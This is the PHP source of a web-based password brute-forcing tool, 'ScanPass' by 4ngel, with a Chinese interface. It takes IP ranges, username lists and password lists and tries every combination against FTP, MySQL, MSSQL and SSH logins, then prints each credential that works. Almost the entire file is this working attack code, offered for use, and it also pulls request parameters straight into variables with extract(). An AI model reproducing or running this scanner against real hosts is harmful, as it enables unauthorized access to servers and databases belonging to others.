<?php
@set_magic_quotes_runtime(0);
@set_time_limit(0);
 
// 允许程序在 register_globals = off 的环境下工作
$onoff = function_exists('ini_get') ? ini_get('register_globals') : get_cfg_var('register_globals');
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}
function pr($a) {
	echo '<tmdsb>'; // 改成pre
	print_r($a);
	echo '</tmdsb>'; // 改成pre
}
 
session_start();
 
$type = in_array($_POST['type'], array('ftp','mysql','mssql','ssh')) ? $_POST['type'] : '';
 
$_SESSION['type'] = $type;
$_SESSION['ftpport'] = $ftpport = $_POST['ftpport'];
$_SESSION['mysqlport'] = $mysqlport = $_POST['mysqlport'];
$_SESSION['mssqlport'] = $mssqlport = $_POST['mssqlport'];
$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];
$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];
$_SESSION['userlist'] = $userlist = $_POST['userlist'];
$_SESSION['passlist'] = $passlist = $_POST['passlist'];
 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>
<style type="text/css">
body, div, td {font-size: 12px;font-family: Arial, sans-serif;color: #333;line-height: 16px;}
a{color:#833;text-decoration:none;}
a:hover{color:#147;text-decoration:underline;}
</style><!--{if $returnurl}-->
</head>
 
<body>
<?php
if ($type && $hostlist && $userlist && isset($passlist)) {
	$hostdb = explode("\n", $hostlist);
	$userdb = explode("\n", $userlist);
	$passdb = explode("\n", $passlist);
	echo '<p>'.$type.' result</p><hr>';
	if ($type == 'mysql') {
		!$mysqlport && $mysqlport = 3306;
		foreach($hostdb as $host){
			$i=0;
			if (strpos($host, '-')) {
				$host1 = explode('-', $host);
				$hoststart = explode('.', $host1[0]);
				$hostend = explode('.', $host1[1]);
 
				for($i=$hoststart[3];$i<$hostend[3];$i++) {
					foreach($userdb as $user) {
						if ($user) {
							foreach($passdb as $pass) {
								!$pass && $pass='';
								$h = $hoststart[0].'.'.$hoststart[1].'.'.$hoststart[2].'.'.$i;
								if($link = @mysql_connect($h.':'.$mysqlport, $user, $pass)) {
									echo $h.':'.$mysqlport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
									@mysql_close($link);
									break;
								}
							}
						}
					}
				}
				continue;
			} else {
				foreach($userdb as $user) {
					if ($user) {
						foreach($passdb as $pass) {
							!$pass && $pass='';
							if($link = mysql_connect($host.':'.$mysqlport, $user, $pass)) {
								echo $host.':'.$mysqlport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
								@mysql_close($link);
								break;
							}
						}
					}
				}
			}
		}
	} elseif ($type == 'ftp') {
		!$ftpport && $ftpport = 21;
 
		foreach($hostdb as $host){
			$i=0;
			if (strpos($host, '-')) {
				$host1 = explode('-', $host);
				$hoststart = explode('.', $host1[0]);
				$hostend = explode('.', $host1[1]);
 
				for($i=$hoststart[3];$i<$hostend[3];$i++) {
					foreach($userdb as $user) {
						if ($user) {
							foreach($passdb as $pass) {
								!$pass && $pass='';
								$h = $hoststart[0].'.'.$hoststart[1].'.'.$hoststart[2].'.'.$i;
								if ($conn_id = @ftp_connect($h, $ftpport)) {
									if (@ftp_login($conn_id, $user, $pass)) {
										echo $h.':'.$ftpport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
										@ftp_close($conn_id);
										break;
									}
								}
							}
						}
					}
				}
				continue;
			} else {
				foreach($userdb as $user) {
					if ($user) {
						foreach($passdb as $pass) {
							!$pass && $pass='';
							if ($conn_id = @ftp_connect($host, $ftpport)) {
								if (@ftp_login($conn_id, $user, $pass)) {
									echo $host.':'.$ftpport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
									@ftp_close($conn_id);
									break;
								}
							}
						}
					}
				}
			}
		}
	} elseif ($type == 'mssql') {
		@ini_set('mssql.charset', 'UTF-8');
		@ini_set('mssql.textlimit', 2147483647);
		@ini_set('mssql.textsize', 2147483647);
		if (extension_loaded('mssql')) {
			foreach($hostdb as $host){
				$i=0;
				if (strpos($host, '-')) {
					$host1 = explode('-', $host);
					$hoststart = explode('.', $host1[0]);
					$hostend = explode('.', $host1[1]);
 
					for($i=$hoststart[3];$i<$hostend[3];$i++) {
						foreach($userdb as $user) {
							if ($user) {
								foreach($passdb as $pass) {
									!$pass && $pass='';
									$h = $hoststart[0].'.'.$hoststart[1].'.'.$hoststart[2].'.'.$i;
									if($link = @mssql_connect($h, $user, $pass, false)) {
										echo $h.':'.$mssqlport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
										@mssql_close($link);
										break;
									}
								}
							}
						}
					}
					continue;
				} else {
					foreach($userdb as $user) {
						if ($user) {
							foreach($passdb as $pass) {
								!$pass && $pass='';
								if($link = @mssql_connect($host, $user, $pass, false)) {
									echo $host.':'.$mssqlport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
									@mssql_close($link);
									break;
								}
							}
						}
					}
				}
			}
		} else {
			echo 'mssql extension is disable.';
		}
	} else {
		if (function_exists('ssh2_connect') && function_exists('ssh2_auth_password')) {
			!$sshport && $sshport = 22;
 
			foreach($hostdb as $host){
				$i=0;
				if (strpos($host, '-')) {
					$host1 = explode('-', $host);
					$hoststart = explode('.', $host1[0]);
					$hostend = explode('.', $host1[1]);
 
					for($i=$hoststart[3];$i<$hostend[3];$i++) {
						foreach($userdb as $user) {
							if ($user) {
								foreach($passdb as $pass) {
									!$pass && $pass='';
									$h = $hoststart[0].'.'.$hoststart[1].'.'.$hoststart[2].'.'.$i;
									if ($conn_id = @ssh2_connect($h, $sshport)) {
										if (@ssh2_auth_password($conn_id, $user, $pass)) {
											echo $h.':'.$sshport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
											break;
										}
									}
								}
							}
						}
					}
					continue;
				} else {
					foreach($userdb as $user) {
						if ($user) {
							foreach($passdb as $pass) {
								!$pass && $pass='';
								if ($conn_id = @ssh2_connect($host, $sshport)) {
									if (@ssh2_auth_password($conn_id, $user, $pass)) {
										echo $host.':'.$sshport.' / <span style="color:#00f;">'.$user.'</span> / <span style="color:#f00;">'.($pass ? $pass : 'NULL').'</span><br />';
										break;
									}
								}
							}
						}
					}
				}
			}
		} else {
			echo "function ssh2_connect doesn't exist";
		}
	}
	echo '<p>Over...</p><hr>';
}
?>
<form id="form1" name="form1" method="post" action="">
	<table border="0" cellpadding="0" cellspacing="5">
		<tr>
			<td valign="top">项目</td>
			<td><input type="radio" name="type" id="ftp" value="ftp" <?php if ($_SESSION['type'] == 'ftp') {echo 'checked';}?> />
			FTP 端口<input type="text" size="5" name="ftpport" id="ftpport" value="<?php if ($_SESSION['ftpport']) {echo $_SESSION['ftpport'];} else {echo '21';}?>" /><br />
			<input type="radio" name="type" id="mysql" value="mysql" <?php if ($_SESSION['type'] == 'mysql' || !$type) {echo 'checked';}?> />
			MYSQL 端口<input type="text" size="5" name="mysqlport" id="mysqlport" value="<?php if ($_SESSION['mysqlport']) {echo $_SESSION['mysqlport'];} else {echo '3306';}?>" /><br />
			<input type="radio" name="type" id="mssql" value="mssql" <?php if ($_SESSION['type'] == 'mssql') {echo 'checked';}?> />
			MSSQL 端口<input type="text" size="5" name="mssqlport" id="mssqlport" value="<?php if ($_SESSION['mssqlport']) {echo $_SESSION['mssqlport'];} else {echo '1433';}?>" /><br />
			<input type="radio" name="type" id="ssh" value="ssh" <?php if ($_SESSION['type'] == 'ssh') {echo 'checked';}?> />
			SSH 端口<input type="text" size="5" name="sshport" id="sshport" value="<?php if ($_SESSION['sshport']) {echo $_SESSION['sshport'];} else {echo '22';}?>" /></td>
		</tr>
		<tr>
			<td valign="top">主机列表</td>
			<td><textarea name="hostlist" id="hostlist" cols="45" rows="5"><?php echo $_SESSION['hostlist'];?></textarea>
			<br />
			192.168.1.1-192.168.1.254<br />
			或一行一个或一行一个段</td>
		</tr>
		<tr>
			<td valign="top">用户名列表</td>
			<td><textarea name="userlist" id="userlist" cols="45" rows="5"><?php echo $_SESSION['userlist'];?></textarea>
			<br />
			一行一个</td>
		</tr>
		<tr>
			<td valign="top">密码列表</td>
			<td><textarea name="passlist" id="passlist" cols="45" rows="5"><?php echo $_SESSION['passlist'];?></textarea>
			<br />
			一行一个</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td><input type="submit" value="提交" /></td>
		</tr>
	</table>
</form>
<hr />
Codz by <a href="http://www.sablog.net/blog">4ngel</a><br />
2010-11-30
</body>
</html>